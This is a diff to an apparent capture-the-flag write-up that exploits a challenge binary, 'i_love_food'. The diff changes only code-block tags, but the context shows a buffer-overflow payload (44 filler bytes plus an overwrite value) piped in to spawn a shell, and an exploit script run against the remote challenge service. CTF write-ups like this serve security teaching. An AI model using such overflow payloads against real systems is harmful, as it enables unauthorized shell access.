@@ -10,7 +10,7 @@ http://internetcest.fun:13338
 
 [This binary](./i_love_food) is given. Let's try it out :
 
-```bash
+```console
 $ ./i_love_food 
 What is your favorite dish ? 
 test
@@ -155,7 +155,7 @@ The program does reach the success message and open another process.
   
 Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to input our payload, and then freeze the shell before it closes :
 
-```bash
+```console
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
 What is your favorite dish ? 
 
@@ -172,7 +172,7 @@ We successfully opened a shell, so the final payload is : `"\x41"*44+"\x0d\xf0\x
 
 Now let's connect to the service and send our payload. To do so, we'll use [this script](./exploit.py) :
 
-```bash
+```console
 $ python3 exploit.py                                                                              
 b"What is your favorite dish ? \nDamn that's a good one !\n"
 whoami
